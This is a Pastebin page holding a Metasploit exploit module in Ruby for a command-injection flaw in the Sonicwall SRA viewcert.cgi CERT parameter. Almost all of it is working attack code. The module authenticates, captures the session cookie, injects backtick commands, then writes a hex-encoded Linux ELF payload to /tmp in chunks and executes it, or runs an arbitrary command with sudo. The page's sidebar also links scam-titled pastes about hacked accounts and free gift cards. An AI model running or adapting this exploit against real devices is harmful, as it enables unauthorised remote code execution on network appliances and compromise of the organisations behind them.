=== Content from pastebin.com_e7594c6a_20250124_221000.html ===


[Pastebin](/)
[API](/doc_api)
[tools](/tools)
[faq](/faq)

[paste](/)

[Login](/login)
[Sign up](/signup)

Advertisement

SHARE
TWEET

![Guest User](/themes/pastebin/img/guest.png)
# Untitled

a guest
Feb 22nd, 2017

4,974
0
Never
[Add comment](/login?return_url=%2Fg1e2qU6N%23add_comment)

**Not a member of Pastebin yet?**
[**Sign Up**](/signup),
it unlocks many cool features!

[Ruby](/archive/ruby) 6.18 KB
| None
|
[0](/login?return_url=%2Fg1e2qU6N "Like") [0](/login?return_url=%2Fg1e2qU6N "Dislike")
[raw](/raw/g1e2qU6N)
[download](/dl/g1e2qU6N)
[clone](/clone/g1e2qU6N)
[embed](/embed/g1e2qU6N)
[print](/print/g1e2qU6N)
[report](/report/g1e2qU6N)

1. # Exploit Title: Sonicwall viewcert.cgi CGI Remote Command Injection Vulnerability
2. # Date: 12/24/2016
3. # Exploit Author: xort @ Critical Start
4. # Vendor Homepage: www.sonicwall.com
5. # Software Link: sonicwall.com/products/sra-virtual-appliance
6. # Version: 8.1.0.2-14sv
7. # Tested on: 8.1.0.2-14sv
8. #
9. # CVE : (awaiting cve)
11. # vuln: viewcert.cgi / CERT parameter
13. # Description PostAuth Sonicwall SRA <= v8.1.0.2-14sv. This exploit leverages a command injection bug.
14. #
15. # xort @ Critical Start
20. require 'msf/core'
22. class MetasploitModule < Msf::Exploit::Remote
23. Rank = ExcellentRanking
24. include  Exploit::Remote::Tcp
25. include Msf::Exploit::Remote::HttpClient
27. def initialize(info = {})
28. super(update\_info(info,
29. 'Name'           => 'Sonicwall SRA <= v8.1.0.2-14sv viewcert.cgi remote exploit',
30. 'Description'    => %q{
31. This module exploits a remote command execution vulnerability in
32. the Sonicwall SRA Appliance Version <=  v8.1.0.2-14sv. The vulnerability exist in
33. a section of the machine's administrative interface for performing configurations
34. related to on-connect scripts to be launched for users' connecting.
35. },
36. 'Author'         =>
37. [
38. 'xort@Critical Start', # vuln + metasploit module
39. ],
40. 'Version'        => '$Revision: 1 $',
41. 'References'     =>
42. [
43. [ 'none', 'none'],
44. ],
45. 'Platform'      => [ 'linux'],
46. 'Privileged'     => true,
47. 'Arch'          => [ ARCH\_X86 ],
48. 'SessionTypes'  => [ 'shell' ],
49. 'Privileged'     => false,
51. 'Payload'        =>
52. {
53. 'Compat' =>
54. {
55. 'ConnectionType' => 'find',
56. }
57. },
59. 'Targets'        =>
60. [
61. ['Linux Universal',
62. {
63. 'Arch' => ARCH\_X86,
64. 'Platform' => 'linux'
65. }
66. ],
67. ],
68. 'DefaultTarget' => 0))
70. register\_options(
71. [
72. OptString.new('PASSWORD', [ false, 'Device password', "" ]),
73. OptString.new('USERNAME', [ true, 'Device password', "admin" ]),
74. OptString.new('CMD', [ false, 'Command to execute', "" ]),
75. Opt::RPORT(443),
76. ], self.class)
77. end
79. def do\_login(username, password\_clear)
80. vprint\_status( "Logging into machine with credentials...\n" )
82. # vars
83. timeout = 1550;
85. # send request
86. res = send\_request\_cgi(
87. {
88. 'method'  => 'POST',
89. 'uri'     => "/cgi-bin/userLogin",
90. 'headers' => {
91. 'Connection' => 'close',
92. 'Content-Type' => 'application/x-www-form-urlencoded',
93. 'User-Agent' => 'Mozilla/5.0 (Windows NT 10.0; Win64; x64; rv:50.0) Gecko/20100101 Firefox/50.0',
94. },
95. 'vars\_post' => {
96. 'username' => username,
97. 'password' => password\_clear,
98. 'domain' => 'LocalDomain',
99. 'loginButton' => 'Login',
100. 'state' => 'login',
101. 'login' => 'true',
102. 'VerifyCert' => '0',
103. 'portalname' => 'VirtualOffice',
104. 'ajax' => 'true'
105. },
106. }, timeout)
108. swap = res.headers['Set-Cookie'].split('\n').grep(/(.\*)swap=([^;]+);/){$2}[0]
110. return swap
111. end
114. def run\_command(swap\_cookie, cmd)
116. # vars
117. timeout = 1550;
119. res = send\_request\_cgi({
120. 'method' => 'POST',
121. 'uri'    => "/cgi-bin/viewcert",
122. 'data' => "buttontype=delete&CERT=newcert-1`#{cmd}`",
123. 'headers' =>
124. {
125. 'Cookie' => "swap=#{swap\_cookie}",
126. },
127. }, timeout)
128. end
130. def run\_command\_spliced(swap\_cookie, cmd)
132. write\_mode = ">"
133. dump\_file = "/tmp/qq"
134. reqs = 0
136. cmd\_encoded = cmd.unpack("H\*").join().gsub(/(\w)(\w)/,'\\x\1\2')
138. for cmd\_chunk in cmd\_encoded.split(/(....................................)/)
140. cmd\_new = "printf \"#{cmd\_chunk}\"#{write\_mode}#{dump\_file}"
141. reqs += 1
143. vprint\_status("Running Command (#{reqs})\n")
145. # set to normal append for loops after the first round
146. if write\_mode == ">"
147. write\_mode = ">>"
148. end
150. # add cmd to array to be exected later
151. run\_command(swap\_cookie, cmd\_new)
152. end
153. #       vprint\_status("Running Final Command ...\n")
155. # execute payload stored at dump\_file
156. run\_command(swap\_cookie, "chmod +x /tmp/qq; sh /tmp/qq")
158. end
160. def exploit
161. # timeout
162. timeout = 1550;
164. # params
165. password\_clear = datastore['PASSWORD']
166. user = datastore['USERNAME']
168. # do authentication
169. swap\_cookie = do\_login(user, password\_clear)
171. vprint\_status("authenticated 'swap' cookie: #{swap\_cookie}\n")
173. #if no 'CMD' string - add code for root shell
174. if not datastore['CMD'].nil? and not datastore['CMD'].empty?
176. cmd = datastore['CMD']
178. # Encode cmd payload
179. encoded\_cmd = cmd.unpack("H\*").join().gsub(/(\w)(\w)/,'\\x\1\2')
181. # kill stale calls to bdump from previous exploit calls for re-use
182. run\_command(swap\_cookie, ("sudo /bin/rm -f /tmp/n; printf \"#{encoded\_cmd}\" > /tmp/n; chmod +rx /tmp/n; /tmp/n" ))
184. else
185. # Encode payload to ELF file for deployment
186. elf = Msf::Util::EXE.to\_linux\_x86\_elf(framework, payload.raw)
187. encoded\_elf = elf.unpack("H\*").join().gsub(/(\w)(\w)/,'\\x\1\2')
190. run\_command\_spliced(swap\_cookie, "printf \"#{encoded\_elf}\">/tmp/m;chmod +rx /tmp/m;/tmp/m")
191. # wait for magic
192. handler
193. end
194. end
195. end

Advertisement

Add Comment
Please, [**Sign In**](/login?return_url=%2Fg1e2qU6N%23add_comment) to add comment

Advertisement

[Public Pastes](/archive)

* [⭐ Binance Account hack 8T](/N3jTC3Ce)
  JavaScript |
  5 sec ago
  | 0.18 KB
* [⭐️ EARN $500 INSTANTLY⭐ QL](/54eMT3js)
  JavaScript |
  5 sec ago
  | 0.18 KB
* [Your Bitcoin Wallet Credentials have been res...](/swrDJkRv)
  GetText |
  7 sec ago
  | 0.26 KB
* [⭐ FREE giftcards method CI](/xgfdAjva)
  JavaScript |
  8 sec ago
  | 0.18 KB
* [BTC ACCOUNTS HACKED](/7Mk4mhsv)
  JavaScript |
  9 sec ago
  | 0.09 KB
* [⭐ get any gift card for FREE⭐ 2T](/vVNequPM)
  JavaScript |
  10 sec ago
  | 0.18 KB
* [⭐ FREE giftcards method AO](/5UKP9XsY)
  JavaScript |
  11 sec ago
  | 0.18 KB
* [Chaturbate Accounts with Tokens](/r8n0cLQd)
  JavaScript |
  13 sec ago
  | 0.09 KB

Advertisement

[create new paste](/)  /
[syntax languages](/languages)  /
[archive](/archive)  /
[faq](/faq)  /
[tools](/tools)  /
[night mode](/night_mode)  /
[api](/doc_api)  /
[scraping api](/doc_scraping_api)  /
[news](/news)  /
[pro](/pro)

[privacy statement](/doc_privacy_statement)  /
[cookies policy](/doc_cookies_policy)  /
[terms of service](/doc_terms_of_service) /
[security disclosure](/doc_security_disclosure)  /
[dmca](/dmca)  /
[report abuse](/report-abuse)  /
[contact](/contact)

By using Pastebin.com you agree to our [cookies policy](/doc_cookies_policy) to enhance your experience.

Site design & logo © 2025 Pastebin

We use cookies for various purposes including analytics. By continuing to use Pastebin, you agree to our use of cookies as described in the [Cookies Policy](/doc_cookies_policy).  OK, I Understand

[![](/themes/pastebin/img/hello.webp)](/signup)

Not a member of Pastebin yet?


